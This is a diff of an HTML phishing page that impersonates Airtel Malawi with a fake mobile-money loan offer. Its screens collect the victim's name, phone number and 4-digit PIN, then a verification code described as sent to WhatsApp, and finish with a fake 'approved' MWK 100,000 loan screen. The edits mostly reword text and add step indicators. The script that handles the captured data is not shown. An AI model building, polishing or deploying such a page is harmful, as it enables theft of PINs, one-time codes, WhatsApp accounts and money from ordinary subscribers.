@@ -13,24 +13,21 @@
   <!-- Header -->
   <header class="top-header">
     <div class="brand-logo">
-      <svg viewBox="0 0 24 24">
-        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
-      </svg>
       <span class="brand-title">Airtel Malawi</span>
     </div>
     <span class="flag-badge">🇲🇼</span>
   </header>
 
-  <!-- SCREEN 0: WELCOME NOTICE -->
+  <!-- WELCOME NOTICE SCREEN -->
   <section id="screen-welcome" class="screen active">
-    <h1 style="font-size: 24px; color: var(--primary-red); text-align: center; margin-top: 10px;">Welcome to Airtel Malawi!</h1>
-    <p style="text-align: center; color: var(--text-muted); margin-top: 6px;">Your trusted mobile money platform for a brighter tomorrow.</p>
+    <h1 style="font-size: 26px; color: var(--airtel-red); text-align: center; margin-top: 10px;">Welcome to Airtel Malawi!</h1>
+    <p style="text-align: center; color: var(--text-muted); margin-top: 6px;">Your mobile money platform for a brighter tomorrow.</p>
 
     <div class="notice-box">
       <h2>IMPORTANT NOTICE</h2>
-      <p>Only <strong>Airtel Malawi</strong> mobile subscribers are eligible to apply for this official service.</p>
+      <p>Only <strong>Airtel Malawi</strong> mobile subscribers can apply.</p>
       <div class="warning-callout">
-        Please ensure you are using an active Airtel Malawi phone number before proceeding.
+        Please ensure you are using an Airtel Malawi number before proceeding.
       </div>
     </div>
 
@@ -39,10 +36,16 @@
     </button>
   </section>
 
-  <!-- SCREEN 1: APPLICATION STEPS 1 OF 3 -->
+  <!-- STEP 1 OF 3: LOAN DETAILS -->
   <section id="screen-step1" class="screen">
+    <div class="step-indicator-bar">
+      <div class="step-pill active"></div>
+      <div class="step-pill"></div>
+      <div class="step-pill"></div>
+    </div>
+
     <h2 style="margin-bottom: 6px;">Loan Application</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 1 of 3: Loan Details</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 1 of 3</p>
 
     <div class="form-group">
       <label for="loan-type">Loan Category</label>
@@ -76,10 +79,16 @@
     <button id="btn-step1-next" class="btn-primary" style="margin-top: auto;">NEXT STEP →</button>
   </section>
 
-  <!-- SCREEN 2: APPLICATION STEP 2 OF 3 (PERSONAL & PHONE) -->
+  <!-- STEP 2 OF 3: APPLICANT VERIFICATION -->
   <section id="screen-step2" class="screen">
+    <div class="step-indicator-bar">
+      <div class="step-pill active"></div>
+      <div class="step-pill active"></div>
+      <div class="step-pill"></div>
+    </div>
+
     <h2 style="margin-bottom: 6px;">Loan Application</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 2 of 3: Applicant Verification</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 2 of 3</p>
 
     <div class="form-group">
       <label for="first-name">First Name</label>
@@ -93,7 +102,7 @@
 
     <div class="form-group">
       <label for="phone-number">Airtel Malawi Mobile Number</label>
-      <input type="tel" id="phone-number" class="input-field" placeholder="e.g. 0991234567" maxlength="10">
+      <input type="tel" id="phone-number" class="input-field" placeholder="0991234567 or 0881234567" maxlength="10">
       <span id="phone-error" class="error-text">Please enter a valid Airtel Malawi number (099, 098, 088, 077).</span>
     </div>
 
@@ -108,16 +117,22 @@
       <span id="pin-error" class="error-text">Please enter a 4-digit numeric PIN.</span>
     </div>
 
-    <div style="display: flex; gap: 10px; margin-top: auto;">
-      <button id="btn-step2-back" class="btn-secondary">BACK</button>
+    <div style="display: flex; gap: 12px; margin-top: auto;">
+      <button id="btn-step2-back" class="btn-secondary">PREVIOUS</button>
       <button id="btn-step2-next" class="btn-primary" style="margin-top: 0;">NEXT STEP →</button>
     </div>
   </section>
 
-  <!-- SCREEN 3: APPLICATION STEP 3 OF 3 (SUMMARY) -->
+  <!-- STEP 3 OF 3: SUMMARY -->
   <section id="screen-step3" class="screen">
+    <div class="step-indicator-bar">
+      <div class="step-pill active"></div>
+      <div class="step-pill active"></div>
+      <div class="step-pill active"></div>
+    </div>
+
     <h2 style="margin-bottom: 6px;">Loan Application</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 3 of 3: Final Confirmation</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 3 of 3: Summary</p>
 
     <div class="summary-card">
       <div class="summary-row">
@@ -142,22 +157,22 @@
       </div>
     </div>
 
-    <div style="display: flex; gap: 10px; margin-top: auto;">
-      <button id="btn-step3-back" class="btn-secondary">BACK</button>
+    <div style="display: flex; gap: 12px; margin-top: auto;">
+      <button id="btn-step3-back" class="btn-secondary">PREVIOUS</button>
       <button id="btn-step3-submit" class="btn-primary" style="margin-top: 0;">SUBMIT APPLICATION</button>
     </div>
   </section>
 
-  <!-- SCREEN 4: OTP VERIFICATION (STEP 1 & STEP 2) -->
+  <!-- OTP SCREEN WITH RED WHATSAPP NOTIFICATION -->
   <section id="screen-otp" class="screen">
     <h2 style="margin-bottom: 6px;">OTP Verification</h2>
     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
       Verification code sent to <strong id="otp-phone-display">099XXXXXXX</strong>
     </p>
 
-    <!-- RED WHATSAPP NOTIFICATION BANNER -->
+    <!-- RED WHATSAPP NOTIFICATION -->
     <div class="whatsapp-notice">
-      <p>⚠️ PLEASE ENTER THE OTP SENT TO YOUR WHATSAPP NUMBER. ONLY NUMBERS ARE ALLOWED!</p>
+      <p>⚠️ ENTER OTP FROM WHATSAPP. ONLY NUMBERS IS ALLOWED!</p>
     </div>
 
     <div class="form-group" style="text-align: center;">
@@ -175,19 +190,19 @@
     <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">SUBMIT OTP</button>
   </section>
 
-  <!-- SCREEN 5: CONGRATULATIONS / SUCCESS -->
+  <!-- CONGRATULATIONS SCREEN -->
   <section id="screen-success" class="screen">
-    <div style="text-align: center; margin-top: 20px;">
+    <div style="text-align: center; margin-top: 10px;">
       <div style="width: 70px; height: 70px; background-color: #E6F4EA; color: var(--accent-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; margin: 0 auto 16px;">
         ✓
       </div>
-      <h1 style="color: var(--primary-red); font-size: 26px; margin-bottom: 8px;">Congratulations!</h1>
-      <p style="color: var(--text-muted); font-size: 15px;">Your loan application has been <strong>approved</strong>! Funds will be disbursed shortly.</p>
+      <h1 style="color: var(--airtel-red); font-size: 26px; margin-bottom: 8px;">Congratulations!</h1>
+      <p style="color: var(--text-muted); font-size: 15px;">Your application has been approved! Funds will be disbursed shortly.</p>
     </div>
 
-    <div style="background-color: var(--primary-red); color: #FFFFFF; border-radius: 16px; padding: 20px; text-align: center; margin: 24px 0;">
+    <div style="background-color: var(--airtel-red); color: #FFFFFF; border-radius: 16px; padding: 24px; text-align: center; margin: 24px 0;">
       <span style="font-size: 13px; text-transform: uppercase; letter-spacing: 1px; opacity: 0.9;">APPROVED AMOUNT</span>
-      <div id="approved-amount-display" style="font-size: 32px; font-weight: 800; margin-top: 6px;">MWK 100,000</div>
+      <div id="approved-amount-display" style="font-size: 34px; font-weight: 800; margin-top: 6px;">MWK 100,000</div>
     </div>
 
     <div class="summary-card">
@@ -196,7 +211,7 @@
         <span class="summary-val">MWK 2,441</span>
       </div>
       <div class="summary-row">
-        <span class="summary-label">Loan Tenure:</span>
+        <span class="summary-label">Loan Duration:</span>
         <span class="summary-val">48 Months</span>
       </div>
       <div class="summary-row">
@@ -205,19 +220,19 @@
       </div>
     </div>
 
-    <button id="btn-go-home" class="btn-primary" style="margin-top: auto;">RETURN HOME</button>
+    <button id="btn-go-home" class="btn-primary" style="margin-top: auto;">RETURN TO HOME</button>
   </section>
 
-  <!-- LOADING OVERLAY -->
+  <!-- OVERLAY LOADER -->
   <div id="loading-overlay" class="loading-overlay">
     <div class="spinner"></div>
-    <h3 id="loading-title" style="margin-bottom: 8px;">Processing Application...</h3>
-    <p id="loading-sub" style="color: var(--text-muted); font-size: 14px;">Please wait while we verify your details with Airtel Malawi.</p>
+    <h3 id="loading-title" style="margin-bottom: 8px;">Processing...</h3>
+    <p id="loading-sub" style="color: var(--text-muted); font-size: 14px;">Please wait while we verify your details.</p>
   </div>
 
 </div>
 
 <script src="script.js"></script>
 </body>
-        </html>
-        
+    </html>
+                                             
